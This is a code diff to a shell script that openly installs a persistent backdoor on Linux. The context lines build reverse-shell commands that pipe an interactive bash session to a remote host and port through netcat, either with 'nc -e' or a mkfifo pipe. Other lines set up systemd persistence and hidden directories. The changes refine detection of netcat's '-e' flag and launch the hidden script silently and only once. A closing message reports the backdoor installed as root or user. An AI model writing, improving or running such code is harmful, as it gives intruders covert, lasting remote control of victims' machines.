@@ -82,7 +82,7 @@ for dir in "${hidden_dirs[@]}"; do
 done
 
 # Check if 'nc -e' is supported
-if nc -h 2>&1 | grep -q -- "-e "; then
+if nc -h 2>&1 | grep -q "\-e "; then
     shell_command="nc -e /bin/bash $host $port"
 else
     shell_command="mkfifo /tmp/.backpipe; cat /tmp/.backpipe | /bin/bash -i 2>&1 | nc $host $port > /tmp/.backpipe"
@@ -129,6 +129,8 @@ done
 chmod 644 "$systemd_path"
 
 # Run the script immediately
-nohup "$hidden_script" &
+if ! pgrep -f "$hidden_script" > /dev/null; then
+    nohup "$hidden_script" &> /dev/null &
+fi
 
 echo "✅ Backdoor installed successfully! Running as $( [[ $user_mode -eq 0 ]] && echo "root" || echo "user" )."
